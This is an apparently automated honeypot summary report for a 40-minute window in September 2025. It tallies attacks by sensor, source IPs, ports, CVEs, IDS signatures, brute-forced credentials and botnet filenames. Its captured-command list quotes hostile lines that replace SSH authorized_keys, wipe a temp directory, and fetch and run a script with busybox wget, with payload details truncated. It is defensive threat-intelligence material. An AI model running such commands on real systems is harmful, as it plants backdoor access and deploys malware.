Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T17:19:55Z
**Timeframe:** 2025-09-29T16:20:01Z to 2025-09-29T17:00:01Z
**Files Used:**
- agg_log_20250929T162001Z.json
- agg_log_20250929T164001Z.json
- agg_log_20250929T170001Z.json

### Executive Summary
This report summarizes honeypot activity over a period of approximately 40 minutes, analyzing data from three separate log files. A total of 12,196 attacks were recorded, with Suricata and Cowrie honeypots detecting the highest number of events. The most prominent attacks involved probes and exploitation attempts targeting SMB and SSH services. A significant number of CVEs were targeted, with CVE-2021-44228 (Log4j) being the most frequently observed. Attackers were observed attempting to download and execute malicious scripts, primarily via `wget` and `curl`.

### Detailed Analysis

**Attacks by Honeypot:**
- Suricata: 4204
- Cowrie: 3989
- Ciscoasa: 1443
- Honeytrap: 1416
- Dionaea: 785
- Sentrypeer: 92
- Tanner: 51
- Adbhoney: 57
- Redishoneypot: 39
- ConPot: 37
- H0neytr4p: 26
- Mailoney: 25
- ElasticPot: 11
- Dicompot: 9
- Honeyaml: 4
- ssh-rsa: 4
- Heralding: 3
- Ipphoney: 1

**Top Attacking IPs:**
- 179.108.56.80
- 203.130.24.42
- 103.101.162.38
- 81.183.253.80
- 46.148.229.196
- 185.156.73.167
- 185.156.73.166
- 123.58.213.127
- 92.63.197.55
- 92.63.197.59
- 200.7.101.139

**Top Targeted Ports/Protocols:**
- TCP/445
- 445
- 22
- 8333
- TCP/1433
- 1433
- 5060
- TCP/80
- 23
- 80
- 6379
- TCP/22

**Most Common CVEs:**
- CVE-2021-44228
- CVE-2002-0013, CVE-2002-0012
- CVE-2002-0013, CVE-2002-0012, CVE-1999-0517
- CVE-2005-4050
- CVE-2021-3449
- CVE-2019-11500
- CVE-2019-16920
- CVE-2024-12856, CVE-2024-12885
- CVE-2014-6271
- CVE-2023-52163
- CVE-2023-31983
- CVE-2023-47565
- CVE-2024-10914
- CVE-2009-2765
- CVE-2015-2051, CVE-2024-33112, CVE-2022-37056, CVE-2019-10891
- CVE-2024-3721
- CVE-2006-3602, CVE-2006-4458, CVE-2006-4542
- CVE-2021-42013
- CVE-2001-0414

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
- `cat /proc/cpuinfo | grep name | wc -l`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `echo -e "..."|passwd|bash`
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget ...; sh w.sh`

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN Suspicious inbound to MSSQL port 1433
- ET INFO Reserved Internal IP Traffic
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32
- ET INFO CURL User Agent
- ET CINS Active Threat Intelligence Poor Reputation IP group 68
- ET EXPLOIT Apache Obfuscated log4j RCE Attempt (tcp ldap) (CVE-2021-44228)

**Users / Login Attempts (user/password):**
- 345gs5662d34/345gs5662d34
- root/1qaz@WSX
- foundry/foundry
- root/nPSpP4PBW0
- test/zhbjETuyMffoL8F
- hive/hive
- alfresco/alfresco
- sa/sql123
- root/zs123456
- root/p@Ssw0rd
- user/fastuser_123

**Files Uploaded/Downloaded:**
- wget.sh
- w.sh
- c.sh
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- rondo.dgx.sh
- apply.cgi

**HTTP User-Agents:**
- No user agents recorded.

**SSH Clients:**
- No SSH clients recorded.

**SSH Servers:**
- No SSH servers recorded.

**Top Attacker AS Organizations:**
- No AS organizations recorded.

### Key Observations and Anomalies
- The high number of Suricata alerts for "ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication" suggests a targeted campaign against SMB vulnerabilities.
- Attackers consistently attempted to modify the SSH `authorized_keys` file to gain persistent access.
- A wide variety of usernames and passwords were used in brute-force attempts, indicating the use of common credential lists.
- Multiple attempts to download and execute shell scripts from remote servers were observed, a common tactic for deploying malware or botnet clients.
- The presence of commands querying system information (`uname`, `lscpu`, `df`) suggests that attackers are performing reconnaissance after gaining initial access.
- A number of attacks appear to be automated, given the speed and repetition of similar commands and connection attempts from the same IP addresses.
